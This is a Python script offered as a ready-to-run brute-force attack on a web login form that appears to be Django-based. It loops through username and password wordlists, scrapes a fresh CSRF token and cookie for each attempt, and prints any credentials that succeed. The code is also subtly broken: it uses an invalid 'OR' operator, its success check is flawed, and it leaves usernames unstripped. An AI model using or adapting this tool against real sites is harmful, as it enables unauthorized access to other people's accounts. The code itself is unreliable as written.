#!/usr/bin/python3

from sys import argv
import requests
from bs4 import BeautifulSoup as Soup

URL = '<Please insert your URL>'
U_FILE = '<Please insert the filepath of user list>'
P_FILE = '<Please insert the filepath of password list>'

def get_token(target_page):
    soup = Soup(target_page.text, "html.parser")
    csrf_token = soup.findAll(attrs={"name": "csrfmiddlewaretoken"})[0].get('value')
    return csrf_token

def get_cookie(target_page):
    cookie = target_page.cookies.get_dict()
    cookie_format = 'csrftoken='+cookie['csrftoken']
    return cookie_format

def check_success(target_page):
    if 'Please enter a correct username and password' OR 'This field is required' in target_page:
        return False
    return True

if __name__ == '__main__':
    url = URL
    uf = open(U_FILE, 'r')
    print('Running brute force attack...')
    for uname in uf:
        pf = open(P_FILE, 'r')
        for password in pf:
            password = password.strip()
            with requests.session() as s:
                #get cookie and csrfmiddlewaretoken
                target_page = s.get(url)
                cookie = get_cookie(target_page)
                csrf_token = get_token(target_page)

                #construct the request payload
                header = {'Cookie': cookie}
                payload = {
                    'username': uname, 
                    'password': password,
                    'csrfmiddlewaretoken': csrf_token
                    }

                #post request
                r = s.post(url, headers=header, data=payload)
                page = r.text
                success = check_success(page)
                print(success)
                r.close()
                if success:
                    print('Password for ' + uname + 'is: ' + password)
                    break      
        pf.close()
    uf.close()
        
